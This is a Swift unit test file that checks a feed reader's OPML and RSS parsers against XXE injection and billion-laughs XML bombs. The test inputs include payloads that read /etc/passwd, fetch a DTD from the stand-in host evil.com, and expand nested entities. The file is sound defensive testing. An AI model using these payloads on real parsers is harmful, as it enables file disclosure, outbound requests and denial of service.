//
//  XXETests.swift
//  FeedReaderTests
//
//  Tests for XML External Entity (XXE) injection prevention
//  in OPML and RSS XML parsers.
//

import XCTest
@testable import FeedReader

class XXETests: XCTestCase {
    
    var opmlManager: OPMLManager!
    
    override func setUp() {
        super.setUp()
        opmlManager = OPMLManager.shared
        FeedManager.shared.resetToDefaults()
    }
    
    // MARK: - OPML Parser XXE Tests
    
    func testOPMLParserIgnoresExternalEntities() {
        let maliciousOPML = """
        <?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <opml version="2.0">
          <head><title>Evil Feed</title></head>
          <body>
            <outline type="rss" text="&xxe;" xmlUrl="https://example.com/feed"/>
          </body>
        </opml>
        """
        let outlines = opmlManager.parseOPML(maliciousOPML)
        // Entity should NOT be resolved — title should not contain file contents
        if let first = outlines.first {
            XCTAssertFalse(first.title.contains("root:"), "XXE entity should not be resolved")
        }
    }
    
    func testOPMLParserIgnoresParameterEntities() {
        let maliciousOPML = """
        <?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">
          %xxe;
        ]>
        <opml version="2.0">
          <head><title>Test</title></head>
          <body>
            <outline type="rss" text="Normal Feed" xmlUrl="https://example.com/feed"/>
          </body>
        </opml>
        """
        let outlines = opmlManager.parseOPML(maliciousOPML)
        // Parser should handle gracefully — not crash or hang fetching external DTD
        XCTAssertTrue(outlines.count <= 1, "Parser should handle parameter entities safely")
    }
    
    func testRSSParserIgnoresExternalEntities() {
        let maliciousRSS = """
        <?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <rss version="2.0">
          <channel>
            <title>&xxe;</title>
            <item>
              <title>Test Story</title>
              <description>A test story description</description>
              <link>https://example.com/story</link>
            </item>
          </channel>
        </rss>
        """
        guard let data = maliciousRSS.data(using: .utf8) else {
            XCTFail("Could not encode malicious RSS as data")
            return
        }
        let parser = RSSFeedParser()
        let stories = parser.parseData(data)
        // Stories should parse without resolved external entities
        for story in stories {
            XCTAssertFalse(story.title.contains("root:"),
                           "RSS parser should not resolve external entities")
        }
    }
    
    func testOPMLBillionLaughsDefense() {
        // Test against XML bomb (billion laughs attack)
        let xmlBomb = """
        <?xml version="1.0"?>
        <!DOCTYPE lolz [
          <!ENTITY lol "lol">
          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
        ]>
        <opml version="2.0">
          <head><title>&lol3;</title></head>
          <body>
            <outline type="rss" text="Test" xmlUrl="https://example.com/feed"/>
          </body>
        </opml>
        """
        let outlines = opmlManager.parseOPML(xmlBomb)
        // Should not crash or consume excessive memory
        XCTAssertTrue(outlines.count <= 1)
    }
    
    func testRSSParserBillionLaughsDefense() {
        let xmlBomb = """
        <?xml version="1.0"?>
        <!DOCTYPE lolz [
          <!ENTITY lol "lol">
          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
        ]>
        <rss version="2.0">
          <channel>
            <title>&lol3;</title>
            <item>
              <title>Test</title>
              <description>Description</description>
              <link>https://example.com/story</link>
            </item>
          </channel>
        </rss>
        """
        guard let data = xmlBomb.data(using: .utf8) else {
            XCTFail("Could not encode XML bomb as data")
            return
        }
        let parser = RSSFeedParser()
        let stories = parser.parseData(data)
        // Should not crash or consume excessive memory
        XCTAssertTrue(stories.count <= 1)
    }
}
